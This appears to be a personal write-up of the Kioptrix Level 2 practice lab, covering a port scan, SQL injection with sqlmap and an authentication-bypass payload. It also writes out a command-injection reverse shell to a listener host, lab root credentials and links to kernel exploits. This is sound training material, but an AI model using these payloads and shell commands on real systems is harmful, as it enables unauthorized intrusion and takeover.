```
192.168.56.111
```

```
    PORT     STATE SERVICE    VERSION
[x] 22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
[ ] 80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
[x] 111/tcp  open  rpcbind    2 (RPC #100000)
[ ] 443/tcp  open  ssl/https?
[x] 631/tcp  open  ipp        CUPS 1.1 --> exists RCE but there's no printer to exploit
[ ] 3306/tcp open  mysql      MySQL (unauthorized)

Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
```
Presented with login page on port 80.
![[kioptrix_level2_img2.png]]
#### How about testing for SQL injection since mysql is running?
Tried with sqlmap, did not work. Why?
This was the original command that you used. 
```bash
sqlmap -r requests.txt 
```
Above command doesn't detect the SQL injection because you need to raise the risk level. Additionally, since you only need to check on any one paramater, say the password, you can specify that to sqlmap so it doesn't check every entry point.
```bash
sqlmap -r requests.txt -p psw --risk=3
```
![[kioptrix_level2_img3.png]]

Also tested with burpsuite with this [list](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt).
```
' or 'x'='x
```

#### Spawning reverse shell
Since the input will run any command we can try to pop up a reverse shell.
```bash
# for listener (run from our local machine)
nc -lvnp 1234

# for the web
; sh -i >& /dev/tcp/192.168.56.157/1234 0>&1
```
Once log in we can check the linux version and found an exploit based on that.


New creds:
```
root
thisisroot
```

### References:
1. https://www.exploit-db.com/exploits/9542
2. https://www.exploit-db.com/exploits/9545
